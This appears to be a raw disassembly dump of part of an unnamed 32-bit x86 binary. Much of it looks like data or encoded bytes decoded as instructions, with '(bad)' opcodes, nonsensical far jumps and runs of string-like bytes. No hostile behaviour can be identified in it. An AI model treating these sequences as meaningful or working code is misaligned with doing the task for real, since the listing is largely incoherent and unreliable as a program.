  4139dd:	bound  ebx,QWORD PTR [edi]
  4139df:	arpl   WORD PTR ds:0x3a4f7d4f,di
  4139e5:	dec    edi
  4139e6:	push   0x4f
  4139e8:	cmp    DWORD PTR [edi+0x7b],ecx
  4139eb:	dec    edi
  4139ec:	cmp    eax,0x304f484f
  4139f1:	dec    edi
  4139f2:	cmp    cl,BYTE PTR [edi+0x34]
  4139f5:	dec    edi
  4139f6:	push   ds
  4139f7:	jb     0x413a18
  4139f9:	jae    0x413a0a
  4139fb:	or     DWORD PTR [eax+eax*4],0x7c
  4139ff:	nop
  413a00:	jge    0x413993
  413a02:	aas    
  413a03:	dec    edi
  413a04:	jbe    0x413a55
  413a06:	cmp    cl,BYTE PTR [edi+0x76]
  413a09:	dec    edi
  413a0a:	ds dec edi
  413a0c:	dec    eax
  413a0d:	dec    edi
  413a0e:	cmp    eax,0x314f7b4f
  413a13:	dec    edi
  413a14:	cmp    cl,BYTE PTR [edi+0x36]
  413a17:	dec    edi
  413a18:	push   ds
  413a19:	sbb    BYTE PTR [edi],0x83
  413a1c:	setae  BYTE PTR [eax+edx*4]
  413a20:	jl     0x4139c2
  413a22:	jge    0x4139c5
  413a24:	aas    
  413a25:	dec    edi
  413a26:	jbe    0x413a77
  413a28:	cmp    cl,BYTE PTR [edi+0x76]
  413a2b:	dec    edi
  413a2c:	ds dec edi
  413a2e:	dec    eax
  413a2f:	dec    edi
  413a30:	cmp    eax,0x314f6d4f
  413a35:	dec    edi
  413a36:	cmp    cl,BYTE PTR [edi+0x36]
  413a39:	dec    edi
  413a3a:	push   ds
  413a3b:	xchg   edx,eax
  413a3c:	pop    ds
  413a3d:	xchg   ebx,eax
  413a3e:	bt     DWORD PTR [eax+eiz*4],ecx
  413a42:	jl     0x4139f4
  413a44:	jge    0x4139f7
  413a46:	aas    
  413a47:	dec    edi
  413a48:	ins    BYTE PTR es:[edi],dx
  413a49:	dec    edi
  413a4a:	cmp    cl,BYTE PTR [edi+0x4e]
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x7b],ecx
  413a51:	dec    edi
  413a52:	cmp    eax,0x304f554f
  413a57:	dec    edi
  413a58:	cmp    cl,BYTE PTR [edi+0x36]
  413a5b:	dec    edi
  413a5c:	push   ds
  413a5d:	mov    ds:0xb30fa31f,al
  413a62:	or     al,0xb0
  413a64:	jl     0x413a26
  413a66:	jge    0x413a29
  413a68:	aas    
  413a69:	dec    edi
  413a6a:	ins    BYTE PTR es:[edi],dx
  413a6b:	dec    edi
  413a6c:	cmp    cl,BYTE PTR [edi+0x4e]
  413a6f:	dec    edi
  413a70:	cmp    DWORD PTR [edi+0x7c],ecx
  413a73:	dec    edi
  413a74:	cmp    eax,0x334f5f4f
  413a79:	dec    edi
  413a7a:	cmp    cl,BYTE PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	push   ds
  413a7f:	mov    dl,0x1f
  413a81:	mov    bl,0xf
  413a83:	ret    
  413a84:	or     al,0xc0
  413a86:	jl     0x413a58
  413a88:	jge    0x413a5b
  413a8a:	aas    
  413a8b:	dec    edi
  413a8c:	ins    BYTE PTR es:[edi],dx
  413a8d:	dec    edi
  413a8e:	cmp    cl,BYTE PTR [edi+0x4e]
  413a91:	dec    edi
  413a92:	cmp    DWORD PTR [edi+0x6a],ecx
  413a95:	dec    edi
  413a96:	cmp    eax,0x304f4e4f
  413a9b:	dec    edi
  413a9c:	cmp    cl,BYTE PTR [edi+0x34]
  413a9f:	dec    edi
  413aa0:	push   ds
  413aa1:	ret    0xc31f
  413aa4:	psrlq  mm1,QWORD PTR [eax+edx*8]
  413aa8:	jl     0x413a8a
  413aaa:	jge    0x413a8d
  413aac:	aas    
  413aad:	dec    edi
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	dec    edi
  413ab0:	cmp    cl,BYTE PTR [edi+0x4e]
  413ab3:	dec    edi
  413ab4:	cmp    DWORD PTR [edi+0x6b],ecx
  413ab7:	dec    edi
  413ab8:	cmp    eax,0x304f484f
  413abd:	dec    edi
  413abe:	cmp    cl,BYTE PTR [edi+0x36]
  413ac1:	dec    edi
  413ac2:	push   ds
  413ac3:	rcr    BYTE PTR [edi],cl
  413ac5:	ror    DWORD PTR [edi],cl
  413ac7:	jecxz  0x413ad5
  413ac9:	loopne 0x413b47
  413acb:	lock jge 0x413abf
  413ace:	aas    
  413acf:	dec    edi
  413ad0:	imul   ecx,DWORD PTR [edi+0x3a],0x394f5f4f
  413ad7:	dec    edi
  413ad8:	dec    edx
  413ad9:	dec    edi
  413ada:	ds dec edi
  413adc:	cmp    cl,BYTE PTR [edi+0x3f]
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	loop   0x413b02
  413ae3:	jecxz  0x413af4
  413ae5:	repz or al,0xf0
  413ae8:	jl     0x413aea
  413aea:	jge    0x413aed
  413aec:	jl     0x413afe
  413aee:	jge    0x413b01
  413af0:	ds dec edi
  413af2:	jg     0x413b43
  413af4:	cmp    cl,BYTE PTR [edi+0x53]
  413af7:	dec    edi
  413af8:	cmp    BYTE PTR [edi+0x6a],cl
  413afb:	dec    edi
  413afc:	ds dec edi
  413afe:	dec    ecx
  413aff:	dec    edi
  413b00:	xor    ecx,DWORD PTR [edi+0x3a]
  413b03:	dec    edi
  413b04:	xor    DWORD PTR [edi+0x1e],ecx
  413b07:	add    bl,BYTE PTR [edi]
  413b09:	add    ecx,DWORD PTR [edi]
  413b0b:	adc    ecx,DWORD PTR [eax+edx*1]
  413b0e:	jl     0x413b30
  413b10:	jge    0x413b33
  413b12:	aas    
  413b13:	dec    edi
  413b14:	add    BYTE PTR [eax],al
  413b16:	sahf   
  413b17:	cmp    DWORD PTR [ecx+0x0],eax
  413b1a:	xchg   edx,eax
  413b1b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b1e:	call   0x413d:0xea00413b
  413b25:	add    BYTE PTR [esi+0x3d],cl
  413b28:	inc    ecx
  413b29:	add    dl,bl
  413b2b:	cmp    eax,0x3b7a0041
  413b30:	inc    ecx
  413b31:	add    BYTE PTR [esi+0x3b],bh
  413b34:	inc    ecx
  413b35:	add    dl,dl
  413b37:	cmp    eax,0x3be20041
  413b3c:	inc    ecx
  413b3d:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  413b44:	pushf  
  413b45:	clc    
  413b46:	xchg   esi,eax
  413b47:	cmp    eax,DWORD PTR [ecx+0x0]
  413b4a:	or     bh,BYTE PTR ds:0x3d1e0041
  413b50:	inc    ecx
  413b51:	add    BYTE PTR [edx],ch
  413b53:	cmp    eax,0x3d3a0041
  413b58:	inc    ecx
  413b59:	add    dh,cl
  413b5b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b5e:	call   0x413b:0xee004139
  413b65:	add    dh,bl
  413b67:	cmp    eax,DWORD PTR [ecx+0x0]
  413b6a:	out    dx,al
  413b6b:	cmp    eax,0x85350041
  413b70:	pushf  
  413b71:	clc    
  413b72:	cwde   
  413b73:	or     edx,DWORD PTR [edi]
  413b75:	and    DWORD PTR [edx-0x64ffbec5],0x8f81161c
  413b7f:	or     eax,0x705
  413b84:	inc    eax
  413b85:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413b89:	fnstsw WORD PTR [ebx+0x72004336]
  413b8f:	push   0xfa8f4145
  413b94:	jne    0x413bf8
  413b96:	(bad)  
  413b97:	in     eax,dx
  413b98:	inc    BYTE PTR [edi]
  413b9a:	mov    esi,0x8a05a3fa
  413b9f:	cmp    eax,DWORD PTR [ecx+0x0]
  413ba2:	xor    al,0x95
  413ba4:	pushf  
  413ba5:	clc    
  413ba6:	xor    al,0x96
  413ba8:	pushf  
  413ba9:	clc    
  413baa:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  413bb0:	pushf  
  413bb1:	clc    
  413bb2:	cmp    DWORD PTR [ebp-0x6ac70764],edx
  413bb8:	pushf  
  413bb9:	clc    
  413bba:	aas    
  413bbb:	xchg   ebp,eax
  413bbc:	pushf  
  413bbd:	clc    
  413bbe:	ds xchg ebp,eax
  413bc0:	pushf  
  413bc1:	clc    
  413bc2:	cmp    eax,0x3cf89c95
  413bc7:	xchg   ebp,eax
  413bc8:	pushf  
  413bc9:	clc    
  413bca:	and    eax,0xe9f89c95
  413bcf:	stc    
  413bd0:	add    esp,DWORD PTR [eax-0x6e]
  413bd3:	cmp    DWORD PTR [ecx+0x0],eax
  413bd6:	xchg   esi,eax
  413bd7:	add    DWORD PTR [ebx+0x0],eax
  413bda:	pop    ecx
  413bdb:	dec    ecx
  413bdc:	imul   si,WORD PTR ds:0x98f89c85,0xffe9
  413be4:	push   eax
  413be5:	pop    es
  413be6:	arpl   WORD PTR [edx],cx
  413be8:	add    BYTE PTR [eax],al
  413bea:	mov    ?,WORD PTR [ecx]
  413bec:	inc    ecx
  413bed:	add    BYTE PTR [edx+0xe040b],bl
	...
  413c23:	adc    BYTE PTR [eax+0x0],al
  413c26:	mov    edx,0x4311
  413c2b:	add    BYTE PTR [eax],al
  413c2d:	add    BYTE PTR [eax+eax*1+0x46],al
  413c31:	add    BYTE PTR [ecx+0x0],ch
  413c34:	outs   dx,DWORD PTR ds:[esi]
  413c35:	add    BYTE PTR [edx+0x0],cl
  413c38:	dec    ecx
  413c39:	add    BYTE PTR [eax+eax*1+0x46],al
  413c3d:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c41:	add    BYTE PTR [ebp+0x0],dl
  413c44:	inc    esi
  413c45:	add    BYTE PTR [edi+0x0],cl
  413c48:	imul   eax,DWORD PTR [eax],0x6f
  413c4b:	add    BYTE PTR [edx+0x0],ch
  413c4e:	dec    ebx
  413c4f:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c53:	add    BYTE PTR [edx+0x0],ch
  413c56:	imul   eax,DWORD PTR [eax],0x46006f
  413c5c:	jo     0x413c5e
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	add    BYTE PTR [ebx+0x0],ch
  413c62:	ins    DWORD PTR es:[edi],dx
  413c63:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c67:	add    BYTE PTR [ebx+0x0],dh
  413c6a:	ins    BYTE PTR es:[edi],dx
  413c6b:	add    BYTE PTR [edx+0x0],ch
  413c6e:	data16 add BYTE PTR [edi+0x0],ah
  413c72:	imul   eax,DWORD PTR [eax],0x64006f
  413c78:	add    BYTE PTR [di+0x0],dh
  413c7c:	imul   eax,DWORD PTR [eax],0x69006a
  413c82:	outs   dx,DWORD PTR ds:[esi]
  413c83:	add    BYTE PTR [esi+0x0],ah
  413c86:	add    BYTE PTR fs:[ebp+0x0],dh
  413c8a:	push   0x0
  413c8c:	add    BYTE PTR [bp+0x0],ah
  413c90:	add    BYTE PTR fs:[eax],al
  413c93:	add    BYTE PTR [eax],al
  413c95:	add    BYTE PTR [ebx+ebp*2+0x6c],al
  413c99:	fs data16 jae 0x413cfe
  413c9d:	push   0x6f
  413c9f:	imul   esp,DWORD PTR [esi+0x64],0x73
  413ca3:	imul   esp,DWORD PTR [esi+0x67],0x6a
  413ca7:	fs addr16 fs pushw 0x6867
  413cae:	addr16 pushw 0x6667
  413cb3:	push   0x6667
  413cb8:	add    BYTE PTR [eax],al
  413cba:	add    BYTE PTR [eax],al
  413cbc:	add    BYTE PTR [eax],al
  413cbe:	dec    ebx
  413cbf:	dec    edx
  413cc0:	dec    edx
  413cc1:	dec    ebx
  413cc2:	inc    esp
  413cc3:	inc    esi
  413cc4:	push   0x6b
  413cc6:	ins    BYTE PTR es:[edi],dx
  413cc7:	dec    esp
  413cc8:	cmp    al,BYTE PTR [esi+eax*2+0x49]
  413ccc:	imul   ebp,DWORD PTR [edi+0x64],0x6b66696a
  413cd3:	fs jae 0x413d45
  413cd6:	imul   esp,DWORD PTR [edi+0x66],0x6f696469
  413cdd:	push   0x69
  413cdf:	outs   dx,DWORD PTR ds:[esi]
  413ce0:	dec    edx
  413ce1:	dec    edi
  413ce2:	inc    esp
  413ce3:	inc    esi
  413ce4:	ins    BYTE PTR es:[edi],dx
  413ce5:	imul   ebp,DWORD PTR [edx+0x66],0x6f
  413ce9:	imul   esp,DWORD PTR [ebx+esi*2+0x67],0x73666a6f
  413cf1:	imul   ebp,DWORD PTR fs:[si+0x66],0x64
  413cf7:	push   0x643b6c67
  413cfc:	push   0x6667
  413d01:	add    BYTE PTR [eax],al
  413d03:	add    BYTE PTR [eax],al
  413d05:	add    BYTE PTR [ebp+0x51004100],dh
  413d0b:	dec    edi
  413d0c:	pop    edi
  413d0d:	dec    edi
  413d0e:	dec    eax
  413d0f:	dec    edi
  413d10:	push   esp
  413d11:	dec    edi
  413d12:	pop    edi
  413d13:	dec    edi
  413d14:	push   esi
  413d15:	dec    edi
  413d16:	or     DWORD PTR [edi+0x8],ecx
  413d19:	dec    edi
  413d1a:	cmp    cl,BYTE PTR [edi+0x0]
  413d1d:	add    BYTE PTR [ebp+0x4f],bl
  413d20:	pop    esi
  413d21:	dec    edi
  413d22:	push   ebx
  413d23:	dec    edi
  413d24:	or     DWORD PTR [edi+0x8],ecx
  413d27:	dec    edi
  413d28:	cmp    cl,BYTE PTR [edi+0x4f]
  413d2b:	dec    edi
  413d2c:	dec    ecx
  413d2d:	dec    edi
  413d2e:	pop    edi
  413d2f:	dec    edi
  413d30:	dec    eax
  413d31:	dec    edi
  413d32:	or     DWORD PTR [edi+0x8],ecx
  413d35:	dec    edi
  413d36:	cmp    cl,BYTE PTR [edi+0x0]
  413d39:	add    BYTE PTR [ecx+0x4f],cl
  413d3c:	push   edx
  413d3d:	dec    edi
  413d3e:	push   esi
  413d3f:	dec    edi
  413d40:	dec    ebp
  413d41:	dec    edi
  413d42:	pop    ebx
  413d43:	dec    edi
  413d44:	dec    edx
  413d45:	dec    edi
  413d46:	push   ebx
  413d47:	dec    edi
  413d48:	cmp    cl,BYTE PTR [edi+0x0]
  413d4b:	add    BYTE PTR [eax],al
  413d4d:	add    BYTE PTR [esi+0x7d],ch
  413d50:	outs   dx,BYTE PTR ds:[esi]
  413d51:	lea    ebp,[esi-0x63]
  413d54:	outs   dx,BYTE PTR ds:[esi]
  413d55:	lods   eax,DWORD PTR ds:[esi]
  413d56:	outs   dx,BYTE PTR ds:[esi]
  413d57:	mov    ebp,0xdd6ecd6e
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	in     eax,dx
  413d5e:	outs   dx,BYTE PTR ds:[esi]
  413d5f:	std    
  413d60:	outs   dx,BYTE PTR ds:[esi]
  413d61:	or     eax,0x2d6e1d6e
  413d66:	outs   dx,BYTE PTR ds:[esi]
  413d67:	cmp    eax,0x6d6e5d6e
  413d6c:	outs   dx,BYTE PTR ds:[esi]
  413d6d:	jb     0x413ddd
  413d6f:	jae    0x413ddf
  413d71:	jo     0x413de1
  413d73:	jno    0x413de3
  413d75:	jbe    0x413de5
  413d77:	ja     0x413de7
  413d79:	je     0x413de9
  413d7b:	jne    0x413deb
  413d7d:	mov    ch,BYTE PTR [esi-0x75]
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	mov    BYTE PTR [esi-0x77],ch
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    gs,WORD PTR [esi+0x7c]
  413d88:	pop    esi
  413d89:	jge    0x413dd9
  413d8b:	jge    0x413d4b
  413d8d:	jge    0x413deb
  413d8f:	(bad)  
  413d90:	jge    0x413e02
  413d92:	mov    ebp,0x79736eb1
  413d97:	bound  esp,QWORD PTR [edx+0x78265fc6]
  413d9d:	add    BYTE PTR [ebp+0x17],cl
  413da0:	mov    bl,0x56
  413da2:	mov    ebp,0x423742f4
  413da7:	jle    0x413d46
  413da9:	jno    0x413e0f
  413dab:	mov    cl,0x0
  413dad:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d0],0x40
  413db5:	xlat   BYTE PTR ds:[ebx]
  413db6:	aad    0x93
  413db8:	dec    esp
  413db9:	adc    esp,edx
  413dbb:	jge    0x413d88
  413dbd:	faddp  st(7),st
  413dbf:	leave  
  413dc0:	xchg   BYTE PTR [esi+0x1fa23214],ah
  413dc6:	pusha  
  413dc7:	icebp  
  413dc8:	push   esp
  413dc9:	(bad)  
  413dca:	aad    0x18
  413dcc:	aad    0x71
  413dce:	add    BYTE PTR [eax],al
  413dd0:	add    BYTE PTR [eax],al
  413dd2:	out    dx,eax
  413dd3:	(bad)  [ebx+0x7]
  413dd6:	jmp    0xc02f:0x4500413b
  413ddd:	and    bh,BYTE PTR [ecx+eiz*1+0x41]
  413de1:	add    BYTE PTR [esi+0x53],al
  413de4:	outs   dx,DWORD PTR ds:[esi]
  413de5:	push   ebx
  413de6:	cmp    BYTE PTR [ebx],0x41
  413de9:	add    dh,ah
  413deb:	cmp    eax,DWORD PTR [ecx+0x0]
  413dee:	(bad)  
  413def:	in     eax,dx
  413df0:	adc    al,BYTE PTR [edi]
	...
  413e12:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e19:	pop    ecx
  413e1a:	outs   dx,BYTE PTR ds:[esi]
  413e1b:	jbe    0x413e95
  413e1d:	jns    0x413e73
  413e1f:	push   ecx
  413e20:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  413e24:	je     0x413e87
  413e26:	inc    ebx
  413e27:	jo     0x413e9b
  413e29:	data16 jp 0x413e7e
  413e2c:	jp     0x413e86
  413e2e:	ins    BYTE PTR es:[edi],dx
  413e2f:	je     0x413ea0
  413e31:	jns    0x413ea1
  413e33:	popa   
  413e34:	push   esi
  413e35:	push   ebp
  413e36:	push   0x564476
	...
  413e4b:	add    BYTE PTR [eax],al
  413e4d:	add    BYTE PTR [eax+ecx*2+0x74],dl
  413e51:	dec    esp
  413e52:	push   ebx
  413e53:	jne    0x413ec0
  413e55:	popa   
  413e56:	jp     0x413eac
  413e58:	arpl   WORD PTR [ecx+0x4b],cx
  413e5b:	push   edx
  413e5c:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  413e63:	push   0x66495949
  413e68:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413e6c:	push   esi
  413e6d:	jb     0x413ed7
  413e6f:	add    BYTE PTR [ebx+0x51],al
  413e72:	ins    BYTE PTR es:[edi],dx
  413e73:	pop    eax
  413e74:	ja     0x413ec3
  413e76:	je     0x413eee
  413e78:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  413e7c:	jb     0x413ef7
  413e7e:	inc    edi
  413e7f:	push   edi
  413e80:	push   esi
  413e81:	inc    edi
  413e82:	ins    BYTE PTR es:[edi],dx
  413e83:	inc    ecx
  413e84:	inc    edi
  413e85:	jae    0x413e87
  413e87:	add    BYTE PTR [edi+0x4a],dl
  413e8a:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413e91:	popa   
  413e92:	push   edi
  413e93:	push   esi
  413e94:	add    BYTE PTR [eax],al
  413e96:	in     al,0xf5
  413e98:	jnp    0x413ee8
  413e9a:	jnp    0x413e6a
  413e9c:	cmc    
  413e9d:	(bad)  
  413e9e:	fcomp  DWORD PTR [esi-0x61dcabec]
  413ea4:	lahf   
  413ea5:	mov    ecx,0xceed
  413eaa:	pop    es
  413eab:	add    DWORD PTR [eax],eax
  413ead:	add    BYTE PTR [edi+0x50],cl
  413eb0:	(bad)  
  413eb1:	fwait
  413eb2:	and    al,BYTE PTR [esi]
  413eb4:	sbb    esp,DWORD PTR [esi+edx*4]
  413eb7:	jle    0x413f2b
  413eb9:	imul   edi,DWORD PTR [edi+0x36e5bba],0xffffffcc
  413ec0:	mov    eax,0x15574c4c
  413ec5:	cs (bad) 
  413ec7:	jmp    0x215cea3e
  413ecc:	jmp    0x3c2c:0x46928b5b
  413ed3:	fisttp DWORD PTR [eax-0x5991b79b]
  413ed9:	mov    cs,WORD PTR [edi+0x24]
  413edc:	xor    DWORD PTR [edx],esp
  413ede:	pop    edx
  413edf:	pop    ds
  413ee0:	add    bl,bh
  413ee2:	xchg   BYTE PTR [ebx+0x181705a5],dl
  413ee8:	and    eax,0x7e3c5779
  413eed:	add    al,BYTE PTR [ecx+0x7bcdb365]
  413ef3:	mov    edx,eax
  413ef5:	push   0x23
  413ef7:	sbb    eax,0x9b68998f
  413efc:	in     al,0xc7
  413efe:	out    0xd4,eax
  413f00:	clc    
  413f01:	add    al,0x63
  413f03:	lea    esp,[ebp+0x5d74f52b]
  413f09:	leave  
  413f0a:	rcr    ebp,cl
  413f0c:	add    BYTE PTR [eax+0x30],bh
  413f0f:	mov    esp,edx
  413f11:	jnp    0x413f5d
  413f13:	sbb    DWORD PTR [ebp+0x3bd8ccf5],esp
  413f19:	xchg   ecx,eax
  413f1a:	adc    al,0xd8
  413f1c:	shl    DWORD PTR [ecx],cl
  413f1e:	fs inc ebx
  413f20:	in     al,dx
  413f21:	sub    ah,bh
  413f23:	ins    BYTE PTR es:[edi],dx
  413f24:	addr16 and dh,ch
  413f27:	jmp    0x62c1a634
  413f2c:	icebp  
  413f2d:	pop    edx
  413f2e:	out    0x74,al
  413f30:	bound  ebp,QWORD PTR [edi-0x3e]
  413f33:	xchg   esp,eax
  413f34:	test   al,0x39
  413f36:	mov    eax,ds:0x1563b956
  413f3b:	fmul   QWORD PTR [esi]
  413f3d:	sub    ebx,DWORD PTR [edx]
  413f3f:	inc    esi
  413f40:	loop   0x413f9a
  413f42:	pop    ebx
  413f43:	jne    0x413f61
  413f45:	cs pop ds
  413f47:	(bad)  
  413f48:	mov    eax,ds:0x895296dd
  413f4d:	mov    ebp,0xecb60bad
  413f52:	adc    BYTE PTR gs:[ecx+0x7a],al
  413f56:	fnstcw WORD PTR [esi+0x52]
  413f59:	xchg   DWORD PTR [edi+ebp*8],ebx
  413f5c:	fild   QWORD PTR ds:0x9b89d0d
  413f62:	retf   0xc13c
  413f65:	(bad)  [ebx+0x3b2fa138]
  413f6b:	fucomip st,st(4)
  413f6d:	and    al,0x62
  413f6f:	or     ebx,ebp
  413f71:	ins    DWORD PTR es:[edi],dx
  413f72:	sub    bl,bl
  413f74:	pop    ebp
  413f75:	dec    edi
  413f76:	repnz sbb BYTE PTR [edx],bh
  413f79:	fimul  WORD PTR [edx+edi*2+0x4aec2ede]
  413f80:	push   ss
  413f81:	dec    edi
  413f82:	aam    0x7f
  413f84:	pusha  
  413f85:	neg    DWORD PTR [ecx-0xf]
  413f88:	jne    0x413fab
  413f8a:	fwait
  413f8b:	jbe    0x413f20
  413f8d:	pop    ebp
  413f8e:	jne    0x414008
  413f90:	mov    dh,BYTE PTR [edi+0x6cf02c2]
  413f96:	fidivr WORD PTR [ebx-0x2f]
  413f99:	js     0x414015
  413f9b:	pop    ecx
  413f9c:	xchg   ebx,eax
  413f9d:	cmc    
  413f9e:	out    dx,al
  413f9f:	jecxz  0x413fe6
  413fa1:	cli    
  413fa2:	mov    bh,0xf5
  413fa4:	push   ds
  413fa5:	fwait
  413fa6:	mov    esp,0xea4413ce
  413fab:	je     0x414003
  413fad:	sub    dl,bl
  413faf:	sbb    al,BYTE PTR cs:[eax+0xba6fc1]
	...
  414016:	pop    edx
  414017:	ficom  DWORD PTR [esi+0x60]
  41401a:	(bad)  
  41401b:	in     al,dx
  41401c:	jle    0x414018
  41401e:	mov    ch,0x80
  414020:	cmp    eax,0x2b67c5f9
  414025:	fcomip st,st(4)
  414027:	iret   
  414028:	add    BYTE PTR [eax],al
  41402a:	pop    es
  41402b:	add    DWORD PTR [eax],eax
  41402d:	add    dl,dl
  41402f:	cmp    BYTE PTR fs:[esi+ebx*1-0x2e57cf68],dh
  414037:	and    DWORD PTR [edx],0xde260e8f
  41403d:	cmp    DWORD PTR [edi],edi
  41403f:	stos   BYTE PTR es:[edi],al
  414040:	imul   edx,ebx,0xb91a6052
  414046:	and    al,0xbe
  414048:	mov    ds:0x4dd6141e,eax
  41404d:	jo     0x414020
  41404f:	jns    0x4140c0
  414051:	sub    DWORD PTR [ebp-0x48],0x7cb0beef
  414058:	mov    bh,0x6d
  41405a:	mov    edi,0x3109c0d
  41405f:	loop   0x4140a1
  414061:	call   0x1dc47a82
  414066:	pop    edx
  414067:	mov    bh,0xfc
  414069:	and    BYTE PTR [edi],cl
  41406b:	sub    eax,0x97526e2f
  414070:	retf   
  414071:	jge    0x41400e
  414073:	sahf   
  414074:	fld    TBYTE PTR [esi+esi*4]
  414077:	mov    ebx,0x290ff633
  41407c:	out    dx,al
  41407d:	pop    ds
  41407e:	mov    bh,0x68
  414080:	mov    cl,0xe2
  414082:	div    dh
  414084:	std    
  414085:	shl    DWORD PTR [ecx],1
  414087:	mov    es:0xb67d3ee4,eax
  41408d:	fwait
  41408e:	pop    ds
  41408f:	dec    BYTE PTR [edx-0x36]
  414092:	es mov edx,0xc7062f32
  414098:	hlt    
  414099:	fdivr  DWORD PTR [edx]
  41409b:	jge    0x414081
  41409d:	sbb    dh,bl
  41409f:	mov    eax,ds:0xa7b6328a
  4140a4:	loope  0x41403b
  4140a6:	les    esp,FWORD PTR [edi+0x6c]
  4140a9:	retf   
  4140aa:	dec    esp
  4140ab:	shl    DWORD PTR [ecx],cl
  4140ad:	pop    es
  4140ae:	mov    bl,0x64
  4140b0:	and    ecx,DWORD PTR [eax+0x7d27fdc]
  4140b6:	pop    ecx
  4140b7:	frstor [edx+0x38]
  4140ba:	or     eax,0xf56fef47
  4140bf:	loope  0x41410e
  4140c1:	test   dl,0x8d
  4140c4:	(bad)  
  4140c5:	(bad)  
  4140c7:	fwait
  4140c8:	or     DWORD PTR [ebx-0x5e7bfb0d],0xffffffb8
  4140cf:	pop    ebp
  4140d0:	nop
  4140d1:	xchg   BYTE PTR [edi+0x263cd666],bl
  4140d7:	mov    ?,eax
  4140d9:	or     cl,BYTE PTR [eax]
  4140db:	cmp    ebp,ecx
  4140dd:	inc    eax
  4140de:	ja     0x41408f
  4140e0:	pop    es
  4140e1:	push   eax
  4140e2:	push   0x5a
  4140e4:	imul   esi,DWORD PTR [edi+0x20],0x35
  4140e8:	add    BYTE PTR [esp+edi*1-0x17],al
  4140ec:	rcr    DWORD PTR [ebp+0x60d6bc69],0x4c
  4140f3:	das    
  4140f4:	rol    DWORD PTR [edx],cl
  4140f6:	jno    0x4140a3
  4140f8:	ret    0x92a8
  4140fb:	int    0xe2
  4140fd:	sub    BYTE PTR [ebx+esi*1+0x4bb8f57e],bl
  414104:	cwde   
  414105:	stos   BYTE PTR es:[edi],al
  414106:	mov    ebx,0xa4121f41
  41410b:	add    edi,0x2e
  41410e:	loop   0x41412d
  414110:	in     eax,dx
  414111:	popf   
  414112:	jns    0x4140e2
  414114:	push   edi
  414115:	das    
  414116:	in     eax,dx
  414117:	cmp    edx,DWORD PTR [eax+0x5f2f4a2c]
  41411d:	lock lods eax,DWORD PTR ds:[esi]
  41411f:	jne    0x414128
  414121:	or     dl,BYTE PTR [edi-0x68]
  414124:	cmp    esi,eax
  414126:	call   0xf6e2:0xbae34e6
  41412d:	js     0x4140e5
  41412f:	push   ebp
  414130:	fisttp QWORD PTR [edi+0x73ccb8]
	...
  414196:	add    dl,BYTE PTR [edx]
  414198:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41419e:	push   0xffffffdd
  4141a0:	add    eax,0x314191b4
  4141a5:	mov    al,0xfb
  4141a7:	rol    BYTE PTR [eax],1
  4141a9:	add    BYTE PTR [edi],al
  4141ab:	add    DWORD PTR [eax],eax
  4141ad:	add    bh,al
  4141af:	dec    edx
  4141b0:	dec    esi
  4141b1:	xor    BYTE PTR ds:0xeee22c7a,0xe7
  4141b8:	mov    esp,0xe7fb313
  4141bd:	call   0x2d81:0x8c32d1ba
  4141c4:	and    al,0xac
  4141c6:	jmp    0xc0167247
  4141cb:	add    dh,BYTE PTR [ebp+0x138347d3]
  4141d1:	jle    0x4141b9
  4141d3:	xor    eax,0xdd5c7be1
  4141d8:	out    dx,al
  4141d9:	in     al,0xab
  4141db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141dc:	imul   ebp,DWORD PTR [ecx+0x6a],0xffffffd3
  4141e0:	ror    ecx,0xb5
  4141e3:	and    BYTE PTR [eax+0x1515a5c],ah
  4141e9:	mov    eax,0xc32f1860
  4141ee:	or     al,0x84
  4141f0:	dec    edx
  4141f1:	in     eax,dx
  4141f2:	(bad)  
  4141f4:	lods   al,BYTE PTR ds:[esi]
  4141f5:	jmp    0xff11:0x93c9b7e0
  4141fc:	or     al,0x8a
  4141fe:	cld    
  4141ff:	sub    al,0x54
  414201:	mov    ah,0x65
  414203:	adc    bl,BYTE PTR [esi]
  414205:	hlt    
  414206:	repnz test BYTE PTR [ebx+eiz*2],0xee
  41420b:	aaa    
  41420c:	dec    ebx
  41420d:	cmp    ecx,DWORD PTR [ebx-0x560d5632]
  414213:	in     al,0xc4
  414215:	inc    esi
  414216:	ins    BYTE PTR es:[edi],dx
  414217:	mov    eax,ds:0x45b7e327
  41421c:	out    dx,eax
  41421d:	fwait
  41421e:	je     0x4141d9
  414220:	and    eax,0x430a6794
  414225:	lods   al,BYTE PTR ds:[esi]
  414226:	cmp    ecx,esp
  414228:	push   esi
  414229:	cwde   
  41422a:	push   esp
  41422b:	mov    BYTE PTR [ecx-0x3b],cl
  41422e:	js     0x414256
  414230:	push   eax
  414231:	and    BYTE PTR [ecx+0x72],ah
  414234:	popf   
  414235:	jmp    0x414224
  414237:	push   ebp
  414238:	mov    esi,0x23398b11
  41423d:	add    eax,0x85b3c71c
  414242:	fcomp  st(0)
  414244:	fidivr DWORD PTR [esi-0x5c]
  414247:	lods   eax,DWORD PTR ds:[esi]
  414248:	inc    edi
  414249:	stos   DWORD PTR es:[edi],eax
  41424a:	mov    ah,0x49
  41424c:	dec    ecx
  41424d:	jno    0x4141ff
  41424f:	pop    ebp
  414250:	or     eax,0x32e988fa
